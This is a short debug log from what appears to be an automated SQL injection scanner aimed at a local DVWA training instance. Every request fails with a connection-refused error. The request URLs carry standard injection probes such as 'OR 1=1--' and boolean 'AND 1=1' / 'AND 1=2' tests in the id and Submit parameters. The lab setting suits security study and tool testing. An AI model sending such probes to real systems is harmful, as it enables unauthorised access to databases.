[2026-04-07 07:34:43] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1+OR+1%3D1--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:34:43] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=1+OR+1%3D1-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:34:47] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+1%3D1+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:34:47] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+1%3D1+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:34:52] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+1%3D2+--&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:34:52] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+1%3D2+-- (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:34:56] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+%27a%27%3D%27a&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:34:56] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+%27a%27%3D%27a (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:01] DEBUG    [id] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=%27+AND+%27a%27%3D%27b&Submit=Submit (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
[2026-04-07 07:35:01] DEBUG    [Submit] Request error: HTTPConnectionPool(host='localhost', port=80): Max retries exceeded with url: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit&id=1&Submit=%27+AND+%27a%27%3D%27b (Caused by NewConnectionError("HTTPConnection(host='localhost', port=80): Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it"))
